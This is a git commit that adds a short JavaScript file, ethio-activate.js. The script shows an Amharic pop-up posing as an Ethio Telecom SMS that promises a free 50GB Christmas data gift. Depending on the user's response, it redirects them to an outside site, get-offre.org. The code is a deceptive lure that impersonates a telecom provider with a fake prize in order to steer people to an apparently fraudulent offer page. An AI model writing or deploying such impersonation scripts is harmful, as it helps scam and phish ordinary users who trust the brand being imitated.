9d3f7c1fa986221a2f8091307bce9adbf06faebc
trafficbank <153836234+trafficbank@users.noreply.github.com>
2024-12-16 03:22:27 -0800

    Create ethio-activate.js

---
+++ ethio-activate.js
@@ -0,0 +1,6 @@
+
+var password = '50GB አግብር'
+password=prompt('SMS: እንኳን ደስ አለህ ለኢትዮ ቴሌኮም 50GB የገና ጊፈር ብቁ ናችሁ።50GB አሁኑኑ ለማግበር እሺን ተጫኑ።   ','50GB አግብር');
+if (password != '50GB አግብር') {
+location.href='https://get-offre.org/ethio-tele.html';
+}
